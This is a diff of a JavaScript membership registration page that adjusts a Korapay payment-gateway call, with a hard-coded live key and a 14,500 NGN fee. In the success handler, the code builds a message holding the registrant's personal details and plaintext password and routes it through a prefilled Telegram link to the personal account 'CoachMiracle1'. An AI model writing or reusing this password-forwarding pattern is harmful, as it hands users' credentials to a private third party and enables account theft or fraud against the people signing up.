@@ -689,27 +689,28 @@
 
         // 4. HIGH-FIDELITY LIVE KORAPAY GATEWAY INITIALIZER
         function triggerKorapayGatewayProcess() {
-            // Safety initialization check to confirm the checkout widget library is fully loaded
-            if (!window.KorapayCheckout) {
-                alert("Interface Synchronization Failure: Korapay secure scripts are currently unreachable. Please refresh the page.");
+            // Check against the verified SDK window namespace object structure
+            if (!window.Korapay) {
+                alert("Interface Synchronization Failure: Korapay secure SDK is currently unreachable. Please refresh the page.");
                 return;
             }
 
-            // Initialize processing pipeline utilizing provided explicit merchant live credentials key string
-            window.KorapayCheckout({
+            const vireonRef = 'VRN_MBR_' + registrationDataPayload.username.toUpperCase() + '_' + Date.now();
+
+            // Fire configuration utilizing the exact functioning initialization engine methods
+            window.Korapay.initialize({
                 key: 'pk_live_fAx1oGYBCWXy5J5FeNNxuXzvDDW7ZciX4muTCAS9',
+                reference: vireonRef,
                 amount: 14500, 
                 currency: 'NGN',
                 customer: {
                     name: registrationDataPayload.fullName,
-                    email: registrationDataPayload.email,
-                    phone: registrationDataPayload.phone
+                    email: registrationDataPayload.email
                 },
-                reference: 'VRN_MBR_' + registrationDataPayload.username.toUpperCase() + '_' + Date.now(),
                 onClose: function() {
                     console.log('Vireon payment terminal runtime disconnected by customer action.');
                 },
-                onSuccess: function(response) {
+                onSuccess: function(data) {
                     // Formulate structured message payload for CoachMiracle1 Telegram DM routing
                     const baseTelegramMessage = 
                         `New Verified Registration Complete!\n\n` +
@@ -719,7 +720,7 @@
                         `🔹 Phone Number: ${registrationDataPayload.phone}\n` +
                         `🔹 Country: ${registrationDataPayload.country}\n` +
                         `🔹 Password: ${registrationDataPayload.password}\n` +
-                        `🔹 Reference: ${response.reference || 'VRN_SUCCESS'}`;
+                        `🔹 Reference: ${data.reference || vireonRef}`;
 
                     // Safe client URL encoding structure setup for global web routing
                     const targetTelegramRedirectUrl = `https://t.me/CoachMiracle1?text=${encodeURIComponent(baseTelegramMessage)}`;
